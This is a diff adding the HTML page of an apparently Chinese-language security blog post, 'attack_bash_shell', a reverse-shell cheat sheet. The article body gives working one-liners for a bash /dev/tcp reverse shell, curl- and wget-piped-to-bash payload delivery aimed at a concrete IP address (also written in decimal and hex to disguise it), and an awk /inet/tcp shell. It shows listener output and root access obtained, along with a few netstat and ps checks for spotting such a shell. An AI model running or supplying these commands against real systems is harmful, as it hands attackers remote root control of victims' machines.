@@ -1,0 +1,722 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="tt">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="bash 反弹bash 反弹命令bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;远程IP&#x2F;远程端口 0&gt;&amp;1 被攻击主机现象目前测试CentOS 7.9 环境下 bash 反弹，进程中不会有攻击IP信息，只有 bash -i 的进程，但是网络中存在攻击IP的连接  网络信息netstat -anlp | grep 远程端口 netst">
+<meta property="og:type" content="article">
+<meta property="og:title" content="attack_bash_shell">
+<meta property="og:url" content="https://tthours.github.io/2024/11/14/security/secattack/attack_shell/attack_bash_shell/index.html">
+<meta property="og:site_name" content="tthours">
+<meta property="og:description" content="bash 反弹bash 反弹命令bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;远程IP&#x2F;远程端口 0&gt;&amp;1 被攻击主机现象目前测试CentOS 7.9 环境下 bash 反弹，进程中不会有攻击IP信息，只有 bash -i 的进程，但是网络中存在攻击IP的连接  网络信息netstat -anlp | grep 远程端口 netst">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-11-13T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-30T07:28:09.508Z">
+<meta property="article:author" content="tt">
+<meta property="article:tag" content="security">
+<meta property="article:tag" content="sectools">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>attack_bash_shell - tthours</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tthours.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ten thousand hours</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/hd.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="attack_bash_shell"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        tt
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-11-14 00:00" pubdate>
+          2024年11月14日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          560 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          5 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">attack_bash_shell</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <span id="more"></span>
+
+<h1 id="bash-反弹"><a href="#bash-反弹" class="headerlink" title="bash 反弹"></a>bash 反弹</h1><h2 id="bash-反弹命令"><a href="#bash-反弹命令" class="headerlink" title="bash 反弹命令"></a>bash 反弹命令</h2><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;远程IP&#x2F;远程端口 0&gt;&amp;1</p>
+<h2 id="被攻击主机现象"><a href="#被攻击主机现象" class="headerlink" title="被攻击主机现象"></a>被攻击主机现象</h2><p>目前测试CentOS 7.9 环境下 bash 反弹，进程中不会有攻击IP信息，只有 bash -i 的进程，但是网络中存在攻击IP的连接 </p>
+<h3 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h3><p>netstat -anlp | grep 远程端口</p>
+<p>netstat -anlp | grep 远程IP</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@ /]<span class="hljs-comment"># netstat -anlp | grep 2345</span><br>tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>10.185.1.1:33024     远程IP:2345        ESTABLISHED 23262/bash<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><p>通过netstat -anlp 查看恶意网络后再查看相关进程</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@ /]<span class="hljs-comment"># netstat -anlp | grep 2345</span><br>tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>10.185.1.1:33024     远程IP:2345        ESTABLISHED 23262/bash<br>[root@ /]<span class="hljs-comment"># ps -ef | grep 23262</span><br>root    <span class="hljs-number"> 23262 </span>21777 <span class="hljs-number"> 0 </span>15:12 pts/1    00:00:00 bash -i<br>root    <span class="hljs-number"> 23483 </span>23248 <span class="hljs-number"> 0 </span>15:13 pts/2    00:00:00 grep --color=auto 23262<br></code></pre></td></tr></table></figure>
+
+<h3 id="文件描述符信息"><a href="#文件描述符信息" class="headerlink" title="文件描述符信息"></a>文件描述符信息</h3><p>通过查看进程的 0 1 文件描述符，也可以协助判断</p>
+<p>如果都是 socket ，表示</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@ 23262]<span class="hljs-comment"># cd fd</span><br>[root@ fd]<span class="hljs-comment"># ls</span><br>0 <span class="hljs-number"> 1 </span><span class="hljs-number"> 2 </span> 255<br>[root@ fd]<span class="hljs-comment"># ls -lat</span><br>total 0<br>lrwx------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 30 </span>15:13<span class="hljs-number"> 255 </span>-&gt; /dev/tty<br>dr-x------<span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 0 </span>Dec<span class="hljs-number"> 30 </span>15:12 .<br>dr-xr-xr-x<span class="hljs-number"> 9 </span>root root <span class="hljs-number"> 0 </span>Dec<span class="hljs-number"> 30 </span>15:12 ..<br>lrwx------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 30 </span>15:12<span class="hljs-number"> 0 </span>-&gt; socket:[476752063]<br>lrwx------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 30 </span>15:12<span class="hljs-number"> 1 </span>-&gt; socket:[476752063]<br>lrwx------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 30 </span>15:12<span class="hljs-number"> 2 </span>-&gt; socket:[476752063]<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="curl-组合-bash-反弹获取-shell"><a href="#curl-组合-bash-反弹获取-shell" class="headerlink" title="curl 组合 bash 反弹获取 shell"></a>curl 组合 bash 反弹获取 shell</h1><p>攻击主机 web 目录下存放 index.html 或 index.php（需要攻击主机可以解析php文件） 文件，文件内容为 bash 反弹语句</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">121.43.138.192</span>/<span class="hljs-number">1234</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>被攻击主机执行 curl 命令即可被获取权限</p>
+<p><strong>curl IP | bash&#x2F;sh</strong></p>
+<p>IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等</p>
+<p>121.43.138.192</p>
+<p>curl 121.43.138.192 | bash&#x2F;sh</p>
+<p>十进制 2032896704</p>
+<p>curl 2032896704 | bash&#x2F;sh</p>
+<p>十六进制 0x792B8AC0</p>
+<p>curl 0x792B8AC0 | bash&#x2F;sh</p>
+<p>二进制 ？？？01111001001010111000101011000000(需要研究)</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> <span class="hljs-number">121.43.138.192</span> | bash<br>curl <span class="hljs-number">121.43.138.192</span> | sh<br>curl <span class="hljs-number">121.43.138.192</span> | /bin/bash<br>curl <span class="hljs-number">121.43.138.192</span> | /bin/sh<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>攻击成功后</p>
+<p>被攻击主机显示</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[root<span class="hljs-variable">@1bcd09f6c828</span> /]<span class="hljs-comment"># curl 121.43.138.192 | bash</span><br>  % <span class="hljs-title class_">Total</span>    % <span class="hljs-title class_">Received</span> % <span class="hljs-title class_">Xferd</span>  <span class="hljs-title class_">Average</span> <span class="hljs-title class_">Speed</span>   <span class="hljs-title class_">Time</span>    <span class="hljs-title class_">Time</span>     <span class="hljs-title class_">Time</span>  <span class="hljs-title class_">Current</span><br>                                 <span class="hljs-title class_">Dload</span>  <span class="hljs-title class_">Upload</span>   <span class="hljs-title class_">Total</span>   <span class="hljs-title class_">Spent</span>    <span class="hljs-title class_">Left</span>  <span class="hljs-title class_">Speed</span><br><span class="hljs-number">100</span>    <span class="hljs-number">45</span>  <span class="hljs-number">100</span>    <span class="hljs-number">45</span>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>    <span class="hljs-number">495</span>      <span class="hljs-number">0</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span>   <span class="hljs-number">500</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>攻击主机显示</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ nginx]</span># <span class="hljs-selector-tag">nc</span> <span class="hljs-selector-tag">-lvp</span> <span class="hljs-number">1234</span><br><span class="hljs-selector-tag">Ncat</span>: <span class="hljs-selector-tag">Version</span> <span class="hljs-number">7.50</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org/ncat )</span><br><span class="hljs-attribute">Ncat</span>: Listening <span class="hljs-attribute">on </span>:::<span class="hljs-number">1234</span><br><span class="hljs-attribute">Ncat</span>: Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">1234</span><br><span class="hljs-attribute">Ncat</span>: Connection from <span class="hljs-number">218.30</span>.<span class="hljs-number">113.52</span>.<br><span class="hljs-attribute">Ncat</span>: Connection from <span class="hljs-number">218.30</span>.<span class="hljs-number">113.52</span>:<span class="hljs-number">50125</span>.<br>[root<span class="hljs-variable">@1bcd09f6c828</span> /]#<br></code></pre></td></tr></table></figure>
+
+<p>获取到权限</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[root@1bcd09f6c828 /]# id<br>id<br><span class="hljs-attribute">uid</span>=0(root) <span class="hljs-attribute">gid</span>=0(root) <span class="hljs-attribute">groups</span>=0(root)<br>[root@1bcd09f6c828 /]# whoami<br>whoami<br>root<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="awk-反弹"><a href="#awk-反弹" class="headerlink" title="awk 反弹"></a>awk 反弹</h1><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">awk &#x27;BEGIN&#123;s=<span class="hljs-string">&quot;/inet/tcp/0/121.43.138.192/1234&quot;</span>;<span class="hljs-keyword">for</span>(;s|&amp;getline c;<span class="hljs-built_in">close</span>(c))<span class="hljs-keyword">while</span>(c|getline)<span class="hljs-built_in">print</span>|&amp;s;<span class="hljs-built_in">close</span>(s)&#125;&#x27;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="wget-组合-bash-反弹获取-shell"><a href="#wget-组合-bash-反弹获取-shell" class="headerlink" title="wget 组合 bash 反弹获取 shell"></a>wget 组合 bash 反弹获取 shell</h1><p>攻击主机 web 目录下存放文件，文件内容为 bash 反弹语句</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">121.43.138.192</span>/<span class="hljs-number">1234</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>被攻击主机执行 curl 命令即可被获取权限</p>
+<p><strong>wget attIP&#x2F;attfilename -O &#x2F;tmp&#x2F;x.sh &amp;&amp; bash &#x2F;tmp&#x2F;x.sh</strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/security/" class="category-chain-item">security</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/security/sectools/" class="category-chain-item">sectools</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/security/" class="print-no-link">#security</a>
+      
+        <a href="/tags/sectools/" class="print-no-link">#sectools</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>attack_bash_shell</div>
+      <div>https://tthours.github.io/2024/11/14/security/secattack/attack_shell/attack_bash_shell/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>tt</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年11月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              TT
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/11/14/security/netsec/mining/web_mining/" title="web_mining">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">web_mining</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/14/security/secattack/attack_shell/attack_nc_shell/" title="attack_nc_shell">
+                        <span class="hidden-mobile">attack_nc_shell</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
